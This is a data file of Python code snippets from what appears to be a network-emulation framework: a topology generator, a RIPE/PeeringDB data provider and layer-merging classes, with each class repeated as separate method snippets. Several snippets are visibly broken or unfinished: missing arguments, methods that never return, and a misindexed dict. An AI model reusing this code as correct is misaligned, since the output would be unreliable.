  "def postrender(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        for ((scope, type, name), object) in reg.getAll().items():\n            if type != 'hnode': continue\n            self._log('setting resolv.conf for as{}/{}'.format(scope, name))\n            host: Node = object\n            host.appendStartCommand(': > /etc/resolv.conf')\n            for s in self.__servers:\n                host.appendStartCommand('echo \"nameserver {}\" >> /etc/resolv.conf'.format(s))",
  "class DefaultGenerator:\n    \"\"\"!\n    @brief Default topology generator implementation.\n\n    The topology generator providers a way to generate emulation scenarios from\n    real-world topology.\n\n    WIP.\n    \"\"\"\n\n    __provider: DataProvider\n\n    def __init__(self, provider: DataProvider):\n        \"\"\"!\n        @brief create a new topology generator.\n\n        @param provider data provider.\n        \"\"\"\n        self.__provider = provider\n        pass\n\n    def __log(self, message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n\n        @param message message.\n        \"\"\"\n        print('== DefaultGenerator: {}'.format(message), file = stderr)\n\n    def __generate(self, asn: int, emulator: Emulator, depth: int):\n        \"\"\"!\n        @brief recursively (depth-first) generate topology.\n\n        @param asn asn to start on.\n        @param emulator emulator to commit changes on.\n        @param depth levels to traverse.\n        \"\"\"\n        if depth <= 0: return\n\n        self.__log('generating AS{}...'.format(asn))\n\n        base: Base = emulator.getLayer('Base')\n        bgp: Ebgp = emulator.getLayer('Ebgp')\n        routing: Routing = emulator.getLayer('Routing')\n\n        if asn in base.getAsns():\n            self.__log('AS{} already done, skipping...'.format(asn))\n            return\n        \n        self.__log('getting list of IXes joined by AS{}...'.format(asn))\n        ixes = self.__provider.getInternetExchanges()\n\n        self.__log('getting list of prefixes announced by AS{}...'.format(asn))\n        prefixes = self.__provider.getPrefixes()\n\n        self.__log('getting list of peers of AS{}...'.format(asn))\n        peers = self.__provider.getPeers()\n\n        current_as = base.createAutonomousSystem(asn)\n\n        router = current_as.createRouter('router0')\n\n        net_count = 0\n\n        self.__log('creating {} networks for AS{}...'.format(len(prefixes), asn))\n        for prefix in prefixes:\n            netname = 'net{}'.format(net_count)\n\n            self.__log('creating {} with prefix {} for AS{}...'.format(netname, prefix, asn))\n\n            current_as.createNetwork(netname, prefix)\n            router.joinNetwork(netname)\n            \n\n            net_count += 1\n\n        self.__log('looking for details of {} IXes joined by AS{}...'.format(len(ixes), asn))\n        for ix in ixes:\n            if ix in base.getInternetExchangeIds():\n                self.__log('IX{} already created, skipping...')\n                continue\n\n            self.__log('creating new IX, IX{}; getting prefix...'.format(ix))\n            base.createInternetExchange(ix, prefix = self.__provider.getInternetExchangePrefix(ix))\n\n            self.__log('getting members of IX{}...'.format(ix))\n            members = self.__provider.getInternetExchangeMembers(ix)\n\n            self.__log('joining IX{} with AS{}...'.format(ix, asn))\n            router.joinNetwork('ix{}'.format(ix), members[asn])\n            \n            self.__log('creating {} other ASes in IX{}...'.format(len(members.keys()), ix))\n            for member in members.keys():\n                self.__generate(member, emulator, depth - 1)\n                if member in peers.keys():\n                    # FIXME: right = peer is customer, left = peer is provider\n                    rel = peers[member]\n                    self.__log('peering AS{} with AS{} in IX{} using relationship {}...'.format(member, asn, ix, rel))\n                    bgp.addPrivatePeering(ix, member, asn, rel)\n\n\n    def generate(self, startAsn: int, depth: int) -> Emulator:\n        \"\"\"!\n        @brief generate a new emulation.\n\n        @param startAsn ASN to start on.\n        @param depth levels to traverse.\n\n        @returns generated emulator.\n        \"\"\"\n        sim = Emulator()\n        sim.addLayer(Base())\n        sim.addLayer(Routing())\n        sim.addLayer(Ebgp())\n        sim.addLayer(Ibgp())\n        sim.addLayer(Ospf())\n\n        self.__generate(startAsn, sim, depth)\n\n        return sim",
  "def __init__(self, provider: DataProvider):\n        \"\"\"!\n        @brief create a new topology generator.\n\n        @param provider data provider.\n        \"\"\"\n        self.__provider = provider\n        pass",
  "def __log(self, message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n\n        @param message message.\n        \"\"\"\n        print('== DefaultGenerator: {}'.format(message), file = stderr)",
  "def __generate(self, asn: int, emulator: Emulator, depth: int):\n        \"\"\"!\n        @brief recursively (depth-first) generate topology.\n\n        @param asn asn to start on.\n        @param emulator emulator to commit changes on.\n        @param depth levels to traverse.\n        \"\"\"\n        if depth <= 0: return\n\n        self.__log('generating AS{}...'.format(asn))\n\n        base: Base = emulator.getLayer('Base')\n        bgp: Ebgp = emulator.getLayer('Ebgp')\n        routing: Routing = emulator.getLayer('Routing')\n\n        if asn in base.getAsns():\n            self.__log('AS{} already done, skipping...'.format(asn))\n            return\n        \n        self.__log('getting list of IXes joined by AS{}...'.format(asn))\n        ixes = self.__provider.getInternetExchanges()\n\n        self.__log('getting list of prefixes announced by AS{}...'.format(asn))\n        prefixes = self.__provider.getPrefixes()\n\n        self.__log('getting list of peers of AS{}...'.format(asn))\n        peers = self.__provider.getPeers()\n\n        current_as = base.createAutonomousSystem(asn)\n\n        router = current_as.createRouter('router0')\n\n        net_count = 0\n\n        self.__log('creating {} networks for AS{}...'.format(len(prefixes), asn))\n        for prefix in prefixes:\n            netname = 'net{}'.format(net_count)\n\n            self.__log('creating {} with prefix {} for AS{}...'.format(netname, prefix, asn))\n\n            current_as.createNetwork(netname, prefix)\n            router.joinNetwork(netname)\n            \n\n            net_count += 1\n\n        self.__log('looking for details of {} IXes joined by AS{}...'.format(len(ixes), asn))\n        for ix in ixes:\n            if ix in base.getInternetExchangeIds():\n                self.__log('IX{} already created, skipping...')\n                continue\n\n            self.__log('creating new IX, IX{}; getting prefix...'.format(ix))\n            base.createInternetExchange(ix, prefix = self.__provider.getInternetExchangePrefix(ix))\n\n            self.__log('getting members of IX{}...'.format(ix))\n            members = self.__provider.getInternetExchangeMembers(ix)\n\n            self.__log('joining IX{} with AS{}...'.format(ix, asn))\n            router.joinNetwork('ix{}'.format(ix), members[asn])\n            \n            self.__log('creating {} other ASes in IX{}...'.format(len(members.keys()), ix))\n            for member in members.keys():\n                self.__generate(member, emulator, depth - 1)\n                if member in peers.keys():\n                    # FIXME: right = peer is customer, left = peer is provider\n                    rel = peers[member]\n                    self.__log('peering AS{} with AS{} in IX{} using relationship {}...'.format(member, asn, ix, rel))\n                    bgp.addPrivatePeering(ix, member, asn, rel)",
  "def generate(self, startAsn: int, depth: int) -> Emulator:\n        \"\"\"!\n        @brief generate a new emulation.\n\n        @param startAsn ASN to start on.\n        @param depth levels to traverse.\n\n        @returns generated emulator.\n        \"\"\"\n        sim = Emulator()\n        sim.addLayer(Base())\n        sim.addLayer(Routing())\n        sim.addLayer(Ebgp())\n        sim.addLayer(Ibgp())\n        sim.addLayer(Ospf())\n\n        self.__generate(startAsn, sim, depth)\n\n        return sim",
  "class Ris(DataProvider):\n    \"\"\"!\n    @brief data provider based on PeeringDB and RIPE RIS API.\n    \"\"\"\n\n    __cache: Dict[str, Dict[str, Any]]\n\n    def __init__(self):\n        \"\"\"!\n        @brief Create a new RIS data provider.\n        \"\"\"\n        self.__cache = {}\n        self.__cache['prefixes'] = {}\n        self.__cache['peers'] = {}\n        self.__cache['exchanges'] = {}\n        self.__cache['exchange_details'] = {}\n        super().__init__()\n\n    def __ripe(self, verb: str, params: Any) -> Any:\n        \"\"\"!\n        @brief invoke RIPE API.\n\n        @param verb API action.\n        @param params request params.\n\n        @returns API respond.\n        \"\"\"\n        rslt = requests.get('{}/{}/data.json'.format(RIPE_API, verb), params)\n\n        assert rslt.status_code == 200, 'RIPEstat data API returned non-200'\n\n        json = rslt.json()\n        assert json['status'] == 'ok', 'RIPEstat API returned not-OK'\n\n        return json['data']\n    \n    def __peeringdb(self, path: str, params: Any) -> Any:\n        \"\"\"!\n        @brief invoke PeeringDB API.\n\n        @param path API path.\n        @param params request params.\n\n        @returns API respond.\n        \"\"\"\n        rslt = requests.get('{}/{}'.format(PEERINGDB_API, path), params)\n\n        assert rslt.status_code == 200, 'PeeringDB data API returned non-200'\n\n        json = rslt.json()\n        return json['data']\n\n    def getName(self) -> str:\n        return 'Ris'\n\n    def getPrefixes(self, asn: int) -> List[str]:\n        if asn in self.__cache['prefixes']:\n            self._log('prefix list of AS{} in cache.'.format(asn))\n            return self.__cache['prefixes'][asn]\n\n        self._log('prefix list of AS{} not in cache, loading from RIPE RIS...'.format(asn))\n        \n        data = self.__ripe('announced-prefixes', { 'resource': asn })\n\n        prefixes = [p['prefix'] for p in data['prefixes'] if ':' not in p['prefix']]\n        self.__cache['prefixes'][asn] = prefixes\n\n    def getPeers(self, asn: int) -> Dict[int, str]:\n        if asn in self.__cache['peers']:\n            self._log('peer list of AS{} in cache.'.format(asn))\n            return self.__cache['peers'][asn]\n\n        self._log('peer list of AS{} not in cache, loading from RIPE RIS...'.format(asn))\n\n        data = self.__ripe('asn-neighbours', { 'resource': asn })\n\n        peers = {}\n        for peer in data['neighbours']:\n            peers[peer] = peer['type']\n\n        self.__cache['peers'][asn] = peers\n        \n        return peers\n    \n    def getInternetExchanges(self, asn: int) -> List[int]:\n        if asn in self.__cache['exchanges']:\n            self._log('exchange list of AS{} in cache.'.format(asn))\n            return self.__cache['exchanges'][asn]\n        \n        self._log('exchange list of AS{} not in cache, loading from PeeringDB...'.format(asn))\n\n        exchanges = []\n\n        data = self.__peeringdb('net', {\n            'asn': asn,\n            'depth': 1\n        })\n\n        if len(data) > 0: exchanges = data[0]['netixlan_set']\n        \n        if len(exchanges) == 0: self._log('note: AS{} does not have any public exchanges on record.'.format(asn))\n        \n        self.__cache['exchanges'][asn] = exchanges\n\n        return exchanges\n\n    def getInternetExchangeMembers(self, id: int) -> Dict[int, str]:\n        if id in self.__cache['exchange_details']:\n            self._log('exchange details of IX{} in cache.'.format(id))\n            return self.__cache['exchange_details'][id]['']\n        \n        self._log('exchange details of IX{} not in cache, loading from PeeringDB...'.format(id))\n\n    def getInternetExchangePrefix(self, id: int) -> str:\n        return",
  "def __init__(self):\n        \"\"\"!\n        @brief Create a new RIS data provider.\n        \"\"\"\n        self.__cache = {}\n        self.__cache['prefixes'] = {}\n        self.__cache['peers'] = {}\n        self.__cache['exchanges'] = {}\n        self.__cache['exchange_details'] = {}\n        super().__init__()",
  "def __ripe(self, verb: str, params: Any) -> Any:\n        \"\"\"!\n        @brief invoke RIPE API.\n\n        @param verb API action.\n        @param params request params.\n\n        @returns API respond.\n        \"\"\"\n        rslt = requests.get('{}/{}/data.json'.format(RIPE_API, verb), params)\n\n        assert rslt.status_code == 200, 'RIPEstat data API returned non-200'\n\n        json = rslt.json()\n        assert json['status'] == 'ok', 'RIPEstat API returned not-OK'\n\n        return json['data']",
  "def __peeringdb(self, path: str, params: Any) -> Any:\n        \"\"\"!\n        @brief invoke PeeringDB API.\n\n        @param path API path.\n        @param params request params.\n\n        @returns API respond.\n        \"\"\"\n        rslt = requests.get('{}/{}'.format(PEERINGDB_API, path), params)\n\n        assert rslt.status_code == 200, 'PeeringDB data API returned non-200'\n\n        json = rslt.json()\n        return json['data']",
  "def getName(self) -> str:\n        return 'Ris'",
  "def getPrefixes(self, asn: int) -> List[str]:\n        if asn in self.__cache['prefixes']:\n            self._log('prefix list of AS{} in cache.'.format(asn))\n            return self.__cache['prefixes'][asn]\n\n        self._log('prefix list of AS{} not in cache, loading from RIPE RIS...'.format(asn))\n        \n        data = self.__ripe('announced-prefixes', { 'resource': asn })\n\n        prefixes = [p['prefix'] for p in data['prefixes'] if ':' not in p['prefix']]\n        self.__cache['prefixes'][asn] = prefixes",
  "def getPeers(self, asn: int) -> Dict[int, str]:\n        if asn in self.__cache['peers']:\n            self._log('peer list of AS{} in cache.'.format(asn))\n            return self.__cache['peers'][asn]\n\n        self._log('peer list of AS{} not in cache, loading from RIPE RIS...'.format(asn))\n\n        data = self.__ripe('asn-neighbours', { 'resource': asn })\n\n        peers = {}\n        for peer in data['neighbours']:\n            peers[peer] = peer['type']\n\n        self.__cache['peers'][asn] = peers\n        \n        return peers",
  "def getInternetExchanges(self, asn: int) -> List[int]:\n        if asn in self.__cache['exchanges']:\n            self._log('exchange list of AS{} in cache.'.format(asn))\n            return self.__cache['exchanges'][asn]\n        \n        self._log('exchange list of AS{} not in cache, loading from PeeringDB...'.format(asn))\n\n        exchanges = []\n\n        data = self.__peeringdb('net', {\n            'asn': asn,\n            'depth': 1\n        })\n\n        if len(data) > 0: exchanges = data[0]['netixlan_set']\n        \n        if len(exchanges) == 0: self._log('note: AS{} does not have any public exchanges on record.'.format(asn))\n        \n        self.__cache['exchanges'][asn] = exchanges\n\n        return exchanges",
  "def getInternetExchangeMembers(self, id: int) -> Dict[int, str]:\n        if id in self.__cache['exchange_details']:\n            self._log('exchange details of IX{} in cache.'.format(id))\n            return self.__cache['exchange_details'][id]['']\n        \n        self._log('exchange details of IX{} not in cache, loading from PeeringDB...'.format(id))",
  "def getInternetExchangePrefix(self, id: int) -> str:\n        return",
  "class DataProvider:\n    \"\"\"!\n    @brief data source for the topology generator.\n    \"\"\"\n\n    def getName(self) -> str:\n        \"\"\"!\n        @brief Get name of this data provider.\n\n        @returns name of the layer.\n        \"\"\"\n        raise NotImplementedError('getName not implemented')\n\n    def getPrefixes(self, asn: int) -> List[str]:\n        \"\"\"!\n        @brief Get list of prefixes announced by the given ASN.\n        @param asn asn.\n\n        @returns list of prefixes.\n        \"\"\"\n        raise NotImplementedError('getPrefixes not implemented.')\n\n    def getPeers(self, asn: int) -> Dict[int, str]:\n        \"\"\"!\n        @brief Get a dict of peer ASNs of the given ASN.\n        @param asn asn.\n\n        @returns dict where key is asn and value is peering relationship.\n        \"\"\"\n        raise NotImplementedError('getPeers not implemented.')\n\n    def getInternetExchanges(self, asn: int) -> List[int]:\n        \"\"\"!\n        @brief Get list of internet exchanges joined by the given ASN.\n        @param asn asn.\n\n        @returns list of tuples of internet exchange ID. Use\n        getInternetExchangeMembers to get other members.\n        \"\"\"\n        raise NotImplementedError('getInternetExchanges not implemented.')\n\n    def getInternetExchangeMembers(self, id: int) -> Dict[int, str]:\n        \"\"\"!\n        @brief Get internet exchange members for given IX ID.\n        @param id internet exchange ID provided by getInternetExchanges.\n\n        @returns dict where key is ASN and value is IP address in the exchange.\n        Note that if an AS has multiple addresses in the IX, only one should be\n        returned.\n        \"\"\"\n        raise NotImplementedError('getInternetExchangeMembers not implemented.')\n\n    def getInternetExchangePrefix(self, id: int) -> str:\n        \"\"\"!\n        @brief Get internet exchange peering lan prefix for given IX ID.\n        @param id internet exchange ID provided by getInternetExchanges.\n\n        @returns prefix in cidr format.\n        \"\"\"\n        raise NotImplementedError('getInternetExchangeSubnet not implemented.')\n\n    def _log(self, message: str):\n        \"\"\"!\n        @brief Log to stderr.\n        \"\"\"\n        print(\"==== {}DataProvider: {}\".format(self.getName(), message), file=stderr)",
  "def getName(self) -> str:\n        \"\"\"!\n        @brief Get name of this data provider.\n\n        @returns name of the layer.\n        \"\"\"\n        raise NotImplementedError('getName not implemented')",
  "def getPrefixes(self, asn: int) -> List[str]:\n        \"\"\"!\n        @brief Get list of prefixes announced by the given ASN.\n        @param asn asn.\n\n        @returns list of prefixes.\n        \"\"\"\n        raise NotImplementedError('getPrefixes not implemented.')",
  "def getPeers(self, asn: int) -> Dict[int, str]:\n        \"\"\"!\n        @brief Get a dict of peer ASNs of the given ASN.\n        @param asn asn.\n\n        @returns dict where key is asn and value is peering relationship.\n        \"\"\"\n        raise NotImplementedError('getPeers not implemented.')",
  "def getInternetExchanges(self, asn: int) -> List[int]:\n        \"\"\"!\n        @brief Get list of internet exchanges joined by the given ASN.\n        @param asn asn.\n\n        @returns list of tuples of internet exchange ID. Use\n        getInternetExchangeMembers to get other members.\n        \"\"\"\n        raise NotImplementedError('getInternetExchanges not implemented.')",
  "def getInternetExchangeMembers(self, id: int) -> Dict[int, str]:\n        \"\"\"!\n        @brief Get internet exchange members for given IX ID.\n        @param id internet exchange ID provided by getInternetExchanges.\n\n        @returns dict where key is ASN and value is IP address in the exchange.\n        Note that if an AS has multiple addresses in the IX, only one should be\n        returned.\n        \"\"\"\n        raise NotImplementedError('getInternetExchangeMembers not implemented.')",
  "def getInternetExchangePrefix(self, id: int) -> str:\n        \"\"\"!\n        @brief Get internet exchange peering lan prefix for given IX ID.\n        @param id internet exchange ID provided by getInternetExchanges.\n\n        @returns prefix in cidr format.\n        \"\"\"\n        raise NotImplementedError('getInternetExchangeSubnet not implemented.')",
  "def _log(self, message: str):\n        \"\"\"!\n        @brief Log to stderr.\n        \"\"\"\n        print(\"==== {}DataProvider: {}\".format(self.getName(), message), file=stderr)",
  "class DefaultDomainNameCachingServiceMerger(ServiceMerger):\n    \"\"\"!\n    @brief default domain name caching service merger implementation.\n\n    This is the default implementation which invokes the default service merger\n    to handler merging installation targets, and set auto root to true if any one\n    of the inputs have it set to true.\n    \"\"\"\n\n    def _createService(self) -> DomainNameCachingService:\n        return DomainNameCachingService()\n\n    def getTargetType(self) -> str:\n        return 'DomainNameCachingServiceLayer'\n\n    def doMerge(self, objectA: DomainNameCachingService, objectB: DomainNameCachingService) -> DomainNameCachingService:\n        \"\"\"!\n        @brief merge two DomainNameCachingServices.\n\n        @param objectA first DomainNameCachingService.\n        @param objectB second DomainNameCachingService.\n        \n        @returns merged DomainNameCachingService.\n        \"\"\"\n\n        merged: DomainNameCachingService = super().doMerge(objectA, objectB)\n        merged.__auto_root = objectA.__auto_root or objectB.__auto_root\n\n        return merged",
  "def _createService(self) -> DomainNameCachingService:\n        return DomainNameCachingService()",
  "def getTargetType(self) -> str:\n        return 'DomainNameCachingServiceLayer'",
  "def doMerge(self, objectA: DomainNameCachingService, objectB: DomainNameCachingService) -> DomainNameCachingService:\n        \"\"\"!\n        @brief merge two DomainNameCachingServices.\n\n        @param objectA first DomainNameCachingService.\n        @param objectB second DomainNameCachingService.\n        \n        @returns merged DomainNameCachingService.\n        \"\"\"\n\n        merged: DomainNameCachingService = super().doMerge(objectA, objectB)\n        merged.__auto_root = objectA.__auto_root or objectB.__auto_root\n\n        return merged",
  "class DefaultDomainNameServiceMerger(ServiceMerger):\n    \"\"\"!\n    @brief default domain name service merger implementation.\n\n    This is the default implementation which invokes the default service merger\n    to handler merging installation targets, merge the zone tree, and combine\n    masters.\n    \"\"\"\n\n    def __mergeZone(self, a: Zone, b: Zone, dst: Zone, position: str = ''):\n        names = set()\n\n        self._log('merging zone: {}'.format('(root)' if position == '' else position))\n\n        # merge regular records\n        for r in a.getRecords():\n            if r not in dst.getRecords(): dst.addRecord(r)\n        for r in b.getRecords():\n            # TODO: better checks?\n            if r not in dst.getRecords(): dst.addRecord(r) \n\n        # merge gules\n        for r in a.getGuleRecords(): dst.addGuleRecord(r)\n        for r in b.getGuleRecords(): \n            # TODO: better checks?\n            if r not in dst.getGuleRecords(): dst.addGuleRecord(r)\n\n        # merge pending records (vnode)\n        for (n, v) in a.getPendingRecords().items(): dst.resolveToVnode(n, v)\n        for (n, v) in b.getPendingRecords().items():\n            assert n not in dst.getPendingRecords(), 'found conflict: {} already points to a vnode'.format(n)\n            dst.resolveToVnode(n, v)\n\n        # look for all subzones\n        for k in a.getSubZones().keys():\n            self._log('{}.{} zone found in first emulator.'.format(k, position))\n            names.add(k)\n        for k in b.getSubZones().keys():\n            self._log('{}.{} zone found in second emulator.'.format(k, position))\n            names.add(k)\n        \n        # for all subzones,\n        for name in names:\n            # first test for conflicts.\n            assert len([r for r in dst.getRecords() if match('{}\\s+'.format(name), r)]) == 0, 'found conflict: {}.{} is both a record and a standalone zone.'.format(name, position)\n\n            # then if no conflict, recursively merge them.\n            self.__mergeZone(a.getSubZone(name), b.getSubZone(name), dst.getSubZone(name), '{}.{}'.format(name, position))\n\n    def __mergeMaster(self, objectA: DomainNameService, objectB: DomainNameService, merged: DomainNameService):\n        masterA = objectA.getMasterIp()\n        masterB = objectB.getMasterIp()\n        new_master = {key: value + masterB[key] for key, value in masterA.items()}\n        merged.setAllMasterIp(new_master)\n\n    def _createService(self) -> DomainNameService:\n        return DomainNameService()\n\n    def getName(self) -> str:\n        return 'DefaultDomainNameServiceMerger'\n\n    def getTargetType(self) -> str:\n        return 'DomainNameServiceLayer'\n\n    def doMerge(self, objectA: DomainNameService, objectB: DomainNameService) -> DomainNameService:\n        \"\"\"!\n        @brief merge two DomainNameService.\n\n        @param objectA first DomainNameService.\n        @param objectB second DomainNameService.\n        \n        @returns merged DomainNameService.\n        \"\"\"\n\n        merged: DomainNameService = super().doMerge(objectA, objectB)\n        \n        self.__mergeZone(objectA.getRootZone(), objectB.getRootZone(), merged.getRootZone())\n        self.__mergeMaster(objectA, objectB, merged)\n        return merged",
  "def __mergeZone(self, a: Zone, b: Zone, dst: Zone, position: str = ''):\n        names = set()\n\n        self._log('merging zone: {}'.format('(root)' if position == '' else position))\n\n        # merge regular records\n        for r in a.getRecords():\n            if r not in dst.getRecords(): dst.addRecord(r)\n        for r in b.getRecords():\n            # TODO: better checks?\n            if r not in dst.getRecords(): dst.addRecord(r) \n\n        # merge gules\n        for r in a.getGuleRecords(): dst.addGuleRecord(r)\n        for r in b.getGuleRecords(): \n            # TODO: better checks?\n            if r not in dst.getGuleRecords(): dst.addGuleRecord(r)\n\n        # merge pending records (vnode)\n        for (n, v) in a.getPendingRecords().items(): dst.resolveToVnode(n, v)\n        for (n, v) in b.getPendingRecords().items():\n            assert n not in dst.getPendingRecords(), 'found conflict: {} already points to a vnode'.format(n)\n            dst.resolveToVnode(n, v)\n\n        # look for all subzones\n        for k in a.getSubZones().keys():\n            self._log('{}.{} zone found in first emulator.'.format(k, position))\n            names.add(k)\n        for k in b.getSubZones().keys():\n            self._log('{}.{} zone found in second emulator.'.format(k, position))\n            names.add(k)\n        \n        # for all subzones,\n        for name in names:\n            # first test for conflicts.\n            assert len([r for r in dst.getRecords() if match('{}\\s+'.format(name), r)]) == 0, 'found conflict: {}.{} is both a record and a standalone zone.'.format(name, position)\n\n            # then if no conflict, recursively merge them.\n            self.__mergeZone(a.getSubZone(name), b.getSubZone(name), dst.getSubZone(name), '{}.{}'.format(name, position))",
  "def __mergeMaster(self, objectA: DomainNameService, objectB: DomainNameService, merged: DomainNameService):\n        masterA = objectA.getMasterIp()\n        masterB = objectB.getMasterIp()\n        new_master = {key: value + masterB[key] for key, value in masterA.items()}\n        merged.setAllMasterIp(new_master)",
  "def _createService(self) -> DomainNameService:\n        return DomainNameService()",
  "def getName(self) -> str:\n        return 'DefaultDomainNameServiceMerger'",
  "def getTargetType(self) -> str:\n        return 'DomainNameServiceLayer'",
  "def doMerge(self, objectA: DomainNameService, objectB: DomainNameService) -> DomainNameService:\n        \"\"\"!\n        @brief merge two DomainNameService.\n\n        @param objectA first DomainNameService.\n        @param objectB second DomainNameService.\n        \n        @returns merged DomainNameService.\n        \"\"\"\n\n        merged: DomainNameService = super().doMerge(objectA, objectB)\n        \n        self.__mergeZone(objectA.getRootZone(), objectB.getRootZone(), merged.getRootZone())\n        self.__mergeMaster(objectA, objectB, merged)\n        return merged",
  "class DefaultWebServiceMerger(ServiceMerger):\n    \"\"\"!\n    @brief default web service merger implementation.\n\n    This is the default implementation which invokes the default service merger\n    to handler merging installation targets.\n    \"\"\"\n\n    def getTargetType(self) -> str:\n        return 'WebServiceLayer'\n\n    def _createService(self) -> WebService:\n        return WebService()",
  "def getTargetType(self) -> str:\n        return 'WebServiceLayer'",
  "def _createService(self) -> WebService:\n        return WebService()",
  "class ServiceMerger(Merger):\n    \"\"\"!\n    @brief Merger that handles merging installation targets.\n    \"\"\"\n\n    def _createService(self) -> Service:\n        \"\"\"!\n        @brief create a new services instance of the service to be merged.\n\n        @returns service instance.\n        \"\"\"\n\n        raise NotImplementedError('_createService not implemented')\n\n    def doMerge(self, objectA: Service, objectB: Service) -> Service:\n        \"\"\"!\n        @brief merge installation targets.\n\n        @param objectA first service instance.\n        @param objectB second service instance.\n\n        @returns merged services.\n        \"\"\"\n\n        assert objectA.getName() == objectB.getName(), 'cannot merge different services.'\n\n        new_service = self._createService()\n\n        new_service.setPendingTargets(dict(objectA.getPendingTargets(), **objectB.getPendingTargets()))\n\n        return new_service",
  "def _createService(self) -> Service:\n        \"\"\"!\n        @brief create a new services instance of the service to be merged.\n\n        @returns service instance.\n        \"\"\"\n\n        raise NotImplementedError('_createService not implemented')",
  "def doMerge(self, objectA: Service, objectB: Service) -> Service:\n        \"\"\"!\n        @brief merge installation targets.\n\n        @param objectA first service instance.\n        @param objectB second service instance.\n\n        @returns merged services.\n        \"\"\"\n\n        assert objectA.getName() == objectB.getName(), 'cannot merge different services.'\n\n        new_service = self._createService()\n\n        new_service.setPendingTargets(dict(objectA.getPendingTargets(), **objectB.getPendingTargets()))\n\n        return new_service",
  "class DefaultDnssecMerger(Merger):\n    \"\"\"!\n    @brief default DNSSEC layer merger implementation.\n\n    This merger merges zone names with DNSSEC enabled.\n    \"\"\"\n\n    def getName(self) -> str:\n        return 'DefaultDnssecMerger'\n\n    def getTargetType(self) -> str:\n        return 'DnssecLayer'\n\n    def doMerge(self, objectA: Dnssec, objectB: Dnssec) -> Dnssec:\n        \"\"\"!\n        @brief perform Dnssec layer merge.\n\n        @param objectA first Dnssec layer.\n        @param objectB second Dnssec layer.\n\n        @returns merged Dnssec layer.\n        \"\"\"\n\n        new_dnssec = Dnssec()\n        for zone in (objectA.getEnabledZones() | objectB.getEnabledZones()):\n            new_dnssec.enableOn(zone)\n\n        return new_dnssec",
  "def getName(self) -> str:\n        return 'DefaultDnssecMerger'",
  "def getTargetType(self) -> str:\n        return 'DnssecLayer'",
  "def doMerge(self, objectA: Dnssec, objectB: Dnssec) -> Dnssec:\n        \"\"\"!\n        @brief perform Dnssec layer merge.\n\n        @param objectA first Dnssec layer.\n        @param objectB second Dnssec layer.\n\n        @returns merged Dnssec layer.\n        \"\"\"\n\n        new_dnssec = Dnssec()\n        for zone in (objectA.getEnabledZones() | objectB.getEnabledZones()):\n            new_dnssec.enableOn(zone)\n\n        return new_dnssec",
  "class DefaultReverseDomainNameServiceMerger(ServiceMerger):\n    \"\"\"!\n    @brief default reverse domain name service merger implementation.\n\n    This is the default implementation which invokes the default service merger\n    to handler merging installation targets.\n    \"\"\"\n\n    def getTargetType(self) -> str:\n        return 'ReverseDomainNameServiceLayer'\n\n    def _createService(self) -> ReverseDomainNameService:\n        return ReverseDomainNameService()",
  "def getTargetType(self) -> str:\n        return 'ReverseDomainNameServiceLayer'",
  "def _createService(self) -> ReverseDomainNameService:\n        return ReverseDomainNameService()",
  "class DefaultBgpLookingGlassServiceMerger(ServiceMerger):\n    \"\"\"!\n    @brief default BGP looking glass service merger implementation.\n\n    This is the default implementation which invokes the default service merger\n    to handler merging installation targets.\n    \"\"\"\n\n    def getTargetType(self) -> str:\n        return 'BgpLookingGlassServiceLayer'\n\n    def _createService(self) -> BgpLookingGlassService:\n        return BgpLookingGlassService()",
  "def getTargetType(self) -> str:\n        return 'BgpLookingGlassServiceLayer'",
  "def _createService(self) -> BgpLookingGlassService:\n        return BgpLookingGlassService()",
  "class DefaultCymruIpOriginServiceMerger(ServiceMerger):\n    \"\"\"!\n    @brief default IP origin service merger implementation.\n\n    This is the default implementation which invokes the default service merger\n    to handler merging installation targets, and merge manually created records.\n    \"\"\"\n\n    def getName(self) -> str:\n        return 'DefaultCymruIpOriginServiceMerger'\n\n    def getTargetType(self) -> str:\n        return 'CymruIpOriginServiceLayer'\n\n    def _createService(self) -> CymruIpOriginService:\n        return CymruIpOriginService()\n\n    def doMerge(self, objectA: CymruIpOriginService, objectB: CymruIpOriginService) -> CymruIpOriginService:\n        \"\"\"!\n        @brief merge two IP origin services.\n\n        @param objectA first IP origin service.\n        @param objectB second IP origin service.\n\n        @returns merged IP origin service.\n        \"\"\"\n\n        new_org: CymruIpOriginService = super().doMerge(objectA, objectB)\n        \n        for record in (objectA.getRecords() + objectB.getRecords()):\n            new_org.addRecord(record)\n\n        return new_org",
  "def getName(self) -> str:\n        return 'DefaultCymruIpOriginServiceMerger'",
  "def getTargetType(self) -> str:\n        return 'CymruIpOriginServiceLayer'",
  "def _createService(self) -> CymruIpOriginService:\n        return CymruIpOriginService()",
  "def doMerge(self, objectA: CymruIpOriginService, objectB: CymruIpOriginService) -> CymruIpOriginService:\n        \"\"\"!\n        @brief merge two IP origin services.\n\n        @param objectA first IP origin service.\n        @param objectB second IP origin service.\n\n        @returns merged IP origin service.\n        \"\"\"\n\n        new_org: CymruIpOriginService = super().doMerge(objectA, objectB)\n        \n        for record in (objectA.getRecords() + objectB.getRecords()):\n            new_org.addRecord(record)\n\n        return new_org",
  "class DefaultMplsMerger(Merger):\n    \"\"\"!\n    @brief default MPLS layer merging implementation.\n    \"\"\"\n\n    def getName(self) -> str:\n        return 'DefaultMplsMerger'\n\n    def getTargetType(self) -> str:\n        return 'MplsLayer'\n\n    def doMerge(self, objectA: Mpls, objectB: Mpls) -> Mpls:\n        \"\"\"!\n        @brief merge two Mpls layers.\n\n        @param objectA first Mpls layer.\n        @param objectB second Mpls layer.\n        \n        @returns merged Mpls layer.\n        \"\"\"\n        new_mpls = Mpls()\n\n        for (asn, nodename) in (objectA.getEdges() | objectB.getEdges()):\n            new_mpls.markAsEdge(asn, nodename)\n\n        for asn in (objectA.getEnabled() | objectB.getEnabled()):\n            new_mpls.enableOn(asn)\n\n        return new_mpls",
  "def getName(self) -> str:\n        return 'DefaultMplsMerger'",
  "def getTargetType(self) -> str:\n        return 'MplsLayer'",
